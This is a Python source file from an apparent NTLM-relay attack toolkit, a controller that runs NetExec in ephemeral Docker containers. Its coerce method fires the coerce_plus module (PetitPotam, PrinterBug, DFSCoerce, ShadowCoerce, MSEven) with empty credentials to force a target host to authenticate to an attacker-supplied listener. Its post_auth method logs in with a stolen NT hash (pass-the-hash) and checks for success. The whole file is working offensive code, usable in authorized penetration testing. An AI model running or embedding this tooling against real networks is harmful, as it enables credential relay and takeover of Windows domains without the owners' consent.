"""Controller for ephemeral NetExec Docker containers."""
from __future__ import annotations

from pathlib import Path
from typing import Any, Dict, List, Optional

from btc_relay_module_nxc_impckt.config import AppConfig
from btc_relay_module_nxc_impckt.logger import get_logger
from btc_relay_module_nxc_impckt.utils.docker_helpers import ensure_image, get_client, run_ephemeral

logger = get_logger()


class NxcController:
    """Runs nxc commands inside ephemeral Docker containers."""

    def __init__(self, cfg: AppConfig) -> None:
        self.cfg = cfg
        self.client = get_client()
        ensure_image(self.client, self.cfg.docker.netexec_image)

    def coerce(
        self,
        target: str,
        method: str,
        callback_host: str,
        always: bool = False,
    ) -> tuple[bool, str]:
        """Run nxc coerce_plus module against target.

        Supports methods: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven.
        Use method='coerce_plus' or empty to run all checks.
        """
        options = f"LISTENER={callback_host}"
        if method and method.lower() not in ("coerce_plus", "all", ""):
            options += f" METHOD={method}"
        if always:
            options += " ALWAYS=true"

        cmd = [
            "smb",
            target,
            "-u", "''",
            "-p", "''",
            "-M", "coerce_plus",
            "-o", options,
        ]
        logger.info(f"[nxc coerce_plus] {method or 'ALL'} -> {target} (listener={callback_host})")
        try:
            stdout = self._run(cmd)
            # nxc coerce_plus prints "[+]" on successful coercion
            success = "[+]" in stdout
            return success, stdout
        except Exception as exc:
            logger.exception(f"nxc coerce_plus failed on {target}")
            return False, str(exc)

    def post_auth(
        self,
        protocol: str,
        target: str,
        username: str,
        nthash: str,
        domain: str = ".",
        extra_args: Optional[List[str]] = None,
    ) -> tuple[bool, str]:
        """Run nxc post-auth check."""
        cmd: List[str] = [protocol, target]
        if username:
            cmd += ["-u", username]
        if nthash:
            cmd += ["-H", nthash]
        if domain and domain != ".":
            cmd += ["-d", domain]
        if extra_args:
            cmd.extend(extra_args)

        logger.info(f"[nxc post-auth] {protocol} {target} as {domain}\\{username}")
        try:
            stdout = self._run(cmd)
            # nxc returns "[+]" on success, "[-]" on failure
            success = "[+]" in stdout
            return success, stdout
        except Exception as exc:
            logger.exception(f"nxc post-auth failed on {target}")
            return False, str(exc)

    def _run(self, cmd: List[str]) -> str:
        volumes: Dict[str, Dict[str, str]] = {}
        # If targets or wordlists exist in cwd, mount them read-only
        cwd = Path.cwd()
        volumes[str(cwd)] = {"bind": "/workspace", "mode": "ro"}

        return run_ephemeral(
            self.client,
            image=self.cfg.docker.netexec_image,
            command=cmd,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
            working_dir="/workspace",
        )
